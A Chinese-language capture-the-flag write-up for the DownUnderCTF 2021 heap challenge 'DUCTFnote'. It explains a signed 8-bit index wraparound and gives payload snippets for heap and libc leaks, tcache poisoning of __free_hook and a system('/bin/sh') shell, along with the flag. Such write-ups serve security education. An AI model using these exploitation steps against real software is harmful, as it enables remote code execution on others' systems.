# DownUnderCTF 2021 - DUCTFnote

## 题目简述

服务只保存一个堆笔记，并把最大请求大小限制为 `0x7f`。但编辑循环使用 `signed char idx`，提供的 ELF 在比较处把 `idx` 符号扩展后执行有符号 `jle`；索引从 127 回绕到 -128 后仍满足条件，于是循环会在 `note->data-128` 到 `note->data+127` 的 256 字节窗口内反复写，直到输入换行。这个向前、向后的堆写原语可以破坏前一块参数对象和 tcache 元数据。

## 解题过程

### 建立循环写原语

笔记与参数结构如下：

```c
typedef struct param {
    unsigned int maxsize;
} param_t;

typedef struct datanote {
    unsigned int size;
    char data;
} datanote_t;
```

源码中的循环是：

```c
signed char idx = 0;
while (idx <= note->size) {
    *(&note->data + idx) = fgetc(stdin);
    idx++;
}
```

对实际 ELF 的反汇编可见地址计算使用 `movsx`，循环尾为：

```asm
movsx edx, BYTE PTR [rbp-0x1]
mov   eax, DWORD PTR [note]
cmp   edx, eax
jle   edit_loop
```

因此必须以二进制行为为准：`idx == 127` 后变成 `-128`，负索引开始覆盖 `note` 前方的堆内容。先创建大小 `0x7f` 的笔记，用官方 solver 的首个布局载荷修复必要的 chunk 头并把前方 `params->maxsize` 改成 `0xffff`：

```python
payload = p64(0) * 26
payload += p32(0)
payload += p64(0x21)
payload += b"\xff" * 2
edit(payload)
delete()
```

此后即可申请原本被拒绝的大笔记。

### 泄露 heap 与 libc

先申请并释放大小 `0x100` 的笔记，使对应 tcache chunk 留下堆指针；再取回 `0x7f` 笔记，通过循环写把其 `size` 改为 `0xffff`。`show_note` 使用 `fwrite(data, note->size, 1, stdout)`，于是产生越界读。官方堆布局中，输出偏移 `276` 处的七字节可恢复 heap 指针；目标大 chunk 地址相对该泄露为 `+0x550`。

随后申请 `0x1000` 的大 chunk，并用一个 `0x370` 请求形成 glibc 2.31 的最大 tcache 类。通过负索引修改 tcache 链头，让一次 `0x370` 分配返回前述大 chunk，再将它释放进 unsorted bin。重复扩大 `note->size` 的越界显示后，输出偏移 `668` 处泄露 `main_arena` 指针，减去提供 libc 对应的 `0x1ebbe0` 得到基址。

```python
heap_leak = u64(output[276:283].ljust(8, b"\0"))
big_chunk = heap_leak + 0x550

arena_leak = u64(output[668:675].ljust(8, b"\0"))
libc.address = arena_leak - 0x1EBBE0
```

这些输出偏移由本题固定分配顺序产生，换编译版本时必须重新检查堆布局。

### tcache poisoning 覆盖 `__free_hook`

再次释放一个 `0x370` 请求对应的 chunk，并用循环写把该 tcache 类的链头改成：

```python
libc.sym.__free_hook - 4
```

偏移减 4 是为了适配 `datanote_t`：伪造分配返回后，`create_note` 会在开头写四字节 `size`，而 `note->data` 恰好从 `__free_hook` 开始。对这个伪笔记执行编辑即可把 `system` 写入 hook：

```python
create(0x370)
edit(p64(libc.sym.system))
```

最后创建一个 `0x170` 笔记，利用同一循环窗口把该分配起始内容布置为 `/bin/sh\0`，同时保持会被 `free` 检查的 chunk 元数据有效。删除笔记时实际执行：

```c
__free_hook(note);  /* system(note) */
```

从而获得 shell，并读取：

```text
DUCTF{n0w_you_4r3_r34dy_f0r_r34l_m$_0d4y}
```

## 方法总结

本题的关键不是普通线性堆溢出，而是八位有符号索引回绕形成的双向循环写。利用顺序是：改大尺寸上限、制造越界读泄露 heap、把大 chunk 送入 unsorted bin 泄露 libc、tcache poisoning 定位 `__free_hook-4`、写入 `system` 并以 `/bin/sh` 指针触发。源码与 C 标准推断出现歧义时，应以赛事提供 ELF 的实际比较指令为证据。
